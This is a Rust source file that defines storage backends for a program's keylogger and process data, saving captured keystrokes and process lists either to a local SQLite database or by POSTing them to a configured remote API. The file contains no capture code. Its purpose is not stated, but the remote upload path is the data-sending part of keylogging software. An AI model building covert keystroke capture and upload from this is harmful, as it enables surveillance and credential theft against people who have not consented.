use crate::api::*;
use crate::keylogger::KeyLogger;
use crate::localdb::*;
use crate::ProcessInfo;
use tracing::*;

use reqwest::Client;
use rusqlite::Connection;

use std::fmt;
use std::sync::Arc;
use std::sync::Mutex;

#[allow(async_fn_in_trait)]
pub trait DataStore {
    async fn store_keys_data(&self, keylogger: &KeyLogger) -> Result<(), DataStoreError>;
    async fn store_proc_data(&self, proc_info: &[ProcessInfo]) -> Result<(), DataStoreError>;
    async fn get_keys_data(&self) -> Result<KeyLogger, DataStoreError>;
    async fn get_proc_data(&self) -> Result<Vec<ProcessInfo>, DataStoreError>;
}

#[derive(Debug, Clone)]
pub struct LocalDbStore {
    con: Arc<Mutex<Connection>>,
}

impl LocalDbStore {
    pub fn new(con: Connection) -> Self {
        let con: Arc<Mutex<Connection>> = Arc::new(Mutex::new(con));
        info!("Backend using SQLite sucessfully initialized.");
        Self { con }
    }
}

impl DataStore for LocalDbStore {
    async fn store_keys_data(&self, keylogger: &KeyLogger) -> Result<(), DataStoreError> {
        let k: KeyLogger = keylogger.clone();
        let con = self.con.clone();

        tokio::task::spawn_blocking(move || {
            let con = con.lock().unwrap();
            update_keyst(&con, &k).map_err(DataStoreError::DbError)
        })
        .await
        .map_err(|e| {
            error!("Error storing key logger data: {}", e);
            DataStoreError::TaskError(e)
        })?
    }

    async fn store_proc_data(&self, proc_info: &[ProcessInfo]) -> Result<(), DataStoreError> {
        let con = self.con.clone();
        let procs = proc_info.to_vec();

        tokio::task::spawn_blocking(move || {
            let con = con.lock().unwrap();
            update_proct(&con, &procs).map_err(DataStoreError::DbError)
        })
        .await
        .map_err(|e| {
            error!("Error storing process data: {}", e);
            DataStoreError::TaskError(e)
        })?
    }

    async fn get_keys_data(&self) -> Result<KeyLogger, DataStoreError> {
        let con = self.con.clone();

        tokio::task::spawn_blocking(move || {
            let con = con.lock().unwrap();
            get_keyst(&con).map_err(DataStoreError::DbError)
        })
        .await
        .map_err(|e| {
            error!("Error retrieving key logger data: {}", e);
            DataStoreError::TaskError(e)
        })?
    }

    async fn get_proc_data(&self) -> Result<Vec<ProcessInfo>, DataStoreError> {
        let con = self.con.clone();

        tokio::task::spawn_blocking(move || {
            let con = con.lock().unwrap();
            get_proct(&con).map_err(DataStoreError::DbError)
        })
        .await
        .map_err(|e| {
            error!("Error retrieving process data: {}", e);
            DataStoreError::TaskError(e)
        })?
    }
}

#[derive(Debug, Clone)]
pub struct ApiStore {
    client: Client,
    config: ApiConfig,
}

impl ApiStore {
    pub fn new(client: Client, config: ApiConfig) -> Self {
        info!("Backend using API sucessfully initialized.");
        Self { client, config }
    }
}

impl DataStore for ApiStore {
    async fn store_keys_data(&self, keylogger: &KeyLogger) -> Result<(), DataStoreError> {
        to_api(&self.client, &self.config, keylogger, reqwest::Method::POST)
            .await
            .map_err(|e| {
                error!("Error storing key logger data: {}", e);
                DataStoreError::ApiError(e)
            })?;

        Ok(())
    }

    async fn store_proc_data(&self, proc_info: &[ProcessInfo]) -> Result<(), DataStoreError> {
        to_api(
            &self.client,
            &self.config,
            &proc_info.to_vec(),
            reqwest::Method::POST,
        )
        .await
        .map_err(|e| {
            error!("Error storing process data: {}", e);
            DataStoreError::ApiError(e)
        })?;

        Ok(())
    }

    async fn get_keys_data(&self) -> Result<KeyLogger, DataStoreError> {
        let k = KeyLogger {
            ..Default::default()
        };
        let result = to_api(&self.client, &self.config, &k, reqwest::Method::GET)
            .await
            .map_err(|e| {
                error!("Error retrieving key logger data: {}", e);
                DataStoreError::ApiError(e)
            })?
            .unwrap();
        Ok(result)
    }

    async fn get_proc_data(&self) -> Result<Vec<ProcessInfo>, DataStoreError> {
        let p: Vec<ProcessInfo> = Vec::new();
        let result = to_api(&self.client, &self.config, &p, reqwest::Method::GET)
            .await
            .map_err(|e| {
                error!("Error retrieving process data: {}", e);
                DataStoreError::ApiError(e)
            })?
            .unwrap();
        Ok(result)
    }
}

#[derive(Debug, Clone)]
pub enum StorageBackend {
    Local(LocalDbStore),
    Api(ApiStore),
}

impl DataStore for StorageBackend {
    async fn store_keys_data(&self, keylogger: &KeyLogger) -> Result<(), DataStoreError> {
        match self {
            StorageBackend::Local(db) => db.store_keys_data(keylogger).await,
            StorageBackend::Api(api) => api.store_keys_data(keylogger).await,
        }
    }

    async fn store_proc_data(&self, proc_info: &[ProcessInfo]) -> Result<(), DataStoreError> {
        match self {
            StorageBackend::Local(db) => db.store_proc_data(proc_info).await,
            StorageBackend::Api(api) => api.store_proc_data(proc_info).await,
        }
    }

    async fn get_keys_data(&self) -> Result<KeyLogger, DataStoreError> {
        match self {
            StorageBackend::Local(db) => db.get_keys_data().await,
            StorageBackend::Api(api) => api.get_keys_data().await,
        }
    }

    async fn get_proc_data(&self) -> Result<Vec<ProcessInfo>, DataStoreError> {
        match self {
            StorageBackend::Local(db) => db.get_proc_data().await,
            StorageBackend::Api(api) => api.get_proc_data().await,
        }
    }
}

#[derive(Debug)]
pub enum DataStoreError {
    ApiError(reqwest::Error),
    DbError(rusqlite::Error),
    TaskError(tokio::task::JoinError),
}

impl fmt::Display for DataStoreError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            DataStoreError::ApiError(e) => write!(f, "API Error: {}", e),
            DataStoreError::DbError(e) => write!(f, "Database Error: {}", e),
            DataStoreError::TaskError(e) => write!(f, "Task Error: {}", e),
        }
    }
}

impl std::error::Error for DataStoreError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            DataStoreError::ApiError(e) => Some(e),
            DataStoreError::DbError(e) => Some(e),
            DataStoreError::TaskError(e) => Some(e),
        }
    }
}

impl From<reqwest::Error> for DataStoreError {
    fn from(err: reqwest::Error) -> Self {
        DataStoreError::ApiError(err)
    }
}

impl From<rusqlite::Error> for DataStoreError {
    fn from(err: rusqlite::Error) -> Self {
        DataStoreError::DbError(err)
    }
}

impl From<tokio::task::JoinError> for DataStoreError {
    fn from(err: tokio::task::JoinError) -> Self {
        DataStoreError::TaskError(err)
    }
}
